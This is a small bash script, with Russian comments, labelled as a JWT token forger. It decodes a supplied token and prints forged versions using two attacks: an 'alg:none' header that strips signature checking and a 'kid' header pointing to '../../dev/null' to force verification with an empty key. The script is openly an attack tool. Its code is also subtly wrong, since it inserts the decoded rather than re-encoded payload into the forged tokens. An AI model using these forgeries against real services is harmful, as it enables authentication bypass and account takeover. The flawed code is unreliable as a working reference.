#!/bin/bash
# ╔══════════════════════════════════════════════╗
# ║   🟡 JWT FORGER — Кузнец JWT-токенов        ║
# ╚══════════════════════════════════════════════╝
TOKEN=${1:-"eyJhbGciOi..."}
echo "╔══════════════════════════════════════════════╗"
echo "║   🔐 JWT FORGER — Кузнец токенов            ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# Декодируем
HEADER=$(echo "$TOKEN" | cut -d'.' -f1 | base64 -d 2>/dev/null)
PAYLOAD=$(echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null)
echo "  📋 Header: $HEADER"
echo "  📋 Payload: $PAYLOAD"
echo ""

# Alg:none атака
NONE_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
NONE_TOKEN="${NONE_HEADER}.${PAYLOAD}."
echo "  💀 Токен с alg:none: $NONE_TOKEN"
echo ""

# Подделка kid
KID_INJECTION=$(echo -n '{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}' | base64 | tr '+/' '-_' | tr -d '=')
echo "  💀 Токен с kid injection: ${KID_INJECTION}.${PAYLOAD}."
echo "[JWT] ✅ Анализ завершён"
